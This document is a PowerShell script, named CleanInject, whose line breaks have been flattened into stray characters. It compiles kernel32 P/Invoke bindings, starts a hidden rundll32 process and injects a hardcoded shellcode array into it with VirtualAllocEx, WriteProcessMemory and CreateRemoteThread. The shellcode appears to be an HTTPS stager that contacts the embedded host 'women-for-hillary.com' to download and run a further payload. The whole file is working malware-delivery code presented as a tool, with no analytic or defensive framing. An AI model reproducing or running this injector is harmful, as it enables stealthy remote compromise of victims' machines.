function CleanInject {n$code = @"nusing System;nusing System.Runtime.InteropServices;nnamespace k32n{n    public class funcn    {n        [Flags]n        public enum ProcessAccessFlags : uintn        {n        All = 0x001F0FFF,n        CreateThread = 0x00000002n        }n        [Flags]n        public enum AllocationTypen        {n        Commit = 0x1000,n        Reserve = 0x2000n        }n        [Flags]n        public enum MemoryProtectionn        {n        ExecuteReadWrite = 0x40,n        ReadWrite = 0x04n        }n        [Flags]n        public enum Time : uintn        { Infinite = 0xFFFFFFFF }n        [DllImport("kernel32.dll")]n        public static extern bool IsWow64Process(IntPtr hProcess, [Out] IntPtr Wow64Process);n        [DllImport("kernel32.dll")]n        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);n        [DllImport("kernel32.dll")]n        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);n        [DllImport("kernel32.dll")]n        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);n        [DllImport("kernel32.dll")]n        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, [Out] IntPtr lpNumberOfBytesWritten);n        [DllImport("kernel32.dll")]n        public static extern IntPtr GetModuleHandle(string lpModuleName);n        [DllImport("kernel32.dll")]n        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);n        [DllImport("kernel32.dll")]n        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, [Out] IntPtr lpflOldProtect);n        [DllImport("kernel32.dll")]n        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);n        [DllImport("kernel32.dll")]n        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);n        [DllImport("kernel32.dll")]n        public static extern bool CloseHandle(IntPtr hObject);n        [DllImport("kernel32.dll")]n        public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);n    }n}n"@n$codeProvider = New-Object Microsoft.CSharp.CSharpCodeProvidern$location = [PsObject].Assembly.Locationn$compileParams = New-Object System.CodeDom.Compiler.CompilerParametersn$assemblyRange = @("System.dll", $location)n$compileParams.ReferencedAssemblies.AddRange($assemblyRange)n$compileParams.GenerateInMemory = $Truen$output = $codeProvider.CompileAssemblyFromSource($compileParams, $code)nfunction Inject-Shellcode-Into-Remote-Proc([Int] $id)n    {n        $procHandle = [k32.func]::OpenProcess([k32.func+ProcessAccessFlags]::All, 0, $id)n        if ([Bool]!$procHandle) { $global:result = 2; return }n        [Byte[]]$wow64 = 0xFFn        if ((Get-WmiObject Win32_Processor AddressWidth).AddressWidth -ne 32)n        {n            $wow64Ptr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($wow64,0)n            $temp = [k32.func]::IsWow64Process($procHandle, $wow64Ptr)n            if ([Bool]!$wow64 -and ([IntPtr]::Size -eq 4)) { $global:result = 9; return }n            elseif ([Bool]!$wow64){ $sc = $sc64 }n        } else { $wow64[0] = 1 }n        $baseAddr = [k32.func]::VirtualAllocEx($procHandle, 0, $sc.Length + 1, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)n        if ([Bool]!$baseAddr) { $global:result = 3; return }n        [Int[]] $bytesWritten = 0n        $bytesWrittenPtr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($bytesWritten,0)n        $success = [k32.func]::WriteProcessMemory($procHandle, $baseAddr, $sc, $sc.Length, $bytesWrittenPtr)n        if ([Bool]!$success) { $global:result = 4; return }n        $k32handle = [k32.func]::GetModuleHandle("kernel32.dll")n        $exitThreadAddr = [k32.func]::GetProcAddress($k32handle, "ExitThread")n        if ([Bool]!$exitThreadAddr) { $global:result = 5; return }n        [Byte[]] $exitThreadAddrLEbytes = New-Object Byte[](4)n        $i=0n        $exitThreadAddr.ToString("X8") -split '([A-F0-9]{2})' | % { if ($_) {$exitThreadAddrLEbytes[$i] = [System.Convert]::ToByte($_,16); $i++}}n        [System.Array]::Reverse($exitThreadAddrLEbytes)n        $baseAddrLEbytes = New-Object Byte[](4)n        $i=0n        $baseAddr.ToString("X8") -split '([A-F0-9]{2})' | % { if ($_) {$baseAddrLEbytes[$i] = [System.Convert]::ToByte($_,16); $i++}}n        [System.Array]::Reverse($baseAddrLEbytes)n        if ([Bool]$wow64) {n            [Byte[]] $callRemoteThread = 0xB8n            $callRemoteThread += $baseAddrLEbytesn            $callRemoteThread += 0xFF,0xD0,0x6A,0x00,0xB8n            $callRemoteThread += $exitThreadAddrLEbytesn            $callRemoteThread += 0xFF,0xD0n            $callRemoteThreadAddr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($callRemoteThread,0)n        } else {n            [Byte[]] $callRemoteThread = 0x48,0xC7,0xC0n            $callRemoteThread += $baseAddrLEbytesn            $callRemoteThread += 0xFF,0xD0,0x6A,0x00,0x48,0xC7,0xC0n            $callRemoteThread += $exitThreadAddrLEbytesn            $callRemoteThread += 0xFF,0xD0n            $callRemoteThreadAddr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($callRemoteThread,0)n        }n        $remoteStubAddr = [k32.func]::VirtualAllocEx($procHandle, 0, $callRemoteThread.Length, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)n        if ([Bool]!$remoteStubAddr) { $global:result = 3; return }n        [Int[]] $OldProtect = 0n        $pOldProtect = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($OldProtect,0)n        $success = [k32.func]::VirtualProtect($callRemoteThreadAddr, $callRemoteThread.Length, [k32.func+MemoryProtection]::ExecuteReadWrite, $pOldProtect)n        if ([Bool]!$success) { $global:result = 6; return }n        $success = [k32.func]::WriteProcessMemory($procHandle, $remoteStubAddr, $callRemoteThread, $callRemoteThread.Length, $bytesWrittenPtr)n        if ([Bool]!$success) { $global:result = 4; return }n        [IntPtr] $threadHandle = [k32.func]::CreateRemoteThread($procHandle, 0, 0, $remoteStubAddr, $baseAddr, 0, 0)n        if ([Bool]!$threadHandle) { $global:result = 7; return }n        $success = [k32.func]::CloseHandle($procHandle)n        if ([Bool]!$success) { $global:result = 8; return }n        $global:result = 1n        returnn    }n[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xe8,0x80,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x57,0x4f,0x57,0x36,0x34,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x00,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x00,0x59,0x31,0xff,0x57,0x57,0x57,0x57,0x51,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x00,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0xbb,0x01,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc3,0xeb,0x7a,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x74,0x48,0x31,0xff,0x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,0xe2,0x5d,0xff,0xd5,0x89,0xc1,0x68,0x45,0x21,0x5e,0x31,0xff,0xd5,0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x00,0x2f,0x00,0x00,0x39,0xc7,0x75,0x04,0x89,0xd8,0xeb,0x8a,0x31,0xff,0xeb,0x15,0xeb,0x49,0xe8,0x81,0xff,0xff,0xff,0x2f,0x51,0x63,0x70,0x67,0x00,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x1d,0xff,0xff,0xff,0x77,0x6f,0x6d,0x65,0x6e,0x2d,0x66,0x6f,0x72,0x2d,0x68,0x69,0x6c,0x6c,0x61,0x72,0x79,0x2e,0x63,0x6f,0x6d,0x00n$ordprocs = (Get-Process -name rundll32 -ErrorAction SilentlyContinue) | Select-Object -property id | select -expand idnif ($ordprocs -eq $null){ ntif ([System.IntPtr]::Size -eq 4) { nttStart-Process -FilePath "C:WindowsSystem32rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hiddenntt$id = (Get-Process -Name rundll32)| Select-Object -property id | select -expand idnttInject-Shellcode-Into-Remote-Proc $idnt}ntelse { nttStart-Process -FilePath "C:WindowsSysWOW64rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hiddenntt$id = (Get-Process -Name rundll32)| Select-Object -property id | select -expand idnttInject-Shellcode-Into-Remote-Proc $idnt}n  }nelse {ntif ([System.IntPtr]::Size -eq 4) { nttStart-Process -FilePath "C:WindowsSystem32rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hiddenntt$rdprocs = (Get-Process -Name rundll32)| Select-Object -property id | select -expand idntt$id = Compare-Object -ReferenceObject $ordprocs -DifferenceObject $rdprocs -PassThrunttInject-Shellcode-Into-Remote-Proc $idnt} ntelse { nttStart-Process -FilePath "C:WindowsSysWOW64rundll32.exe" -ArgumentList "Printui.dll PrintUIEntry" -win Hiddenntt$rdprocs = (Get-Process -Name rundll32)| Select-Object -property id | select -expand idntt$id = Compare-Object -ReferenceObject $ordprocs -DifferenceObject $rdprocs -PassThrunttInject-Shellcode-Into-Remote-Proc $idttnt}n  }n}nCleanInject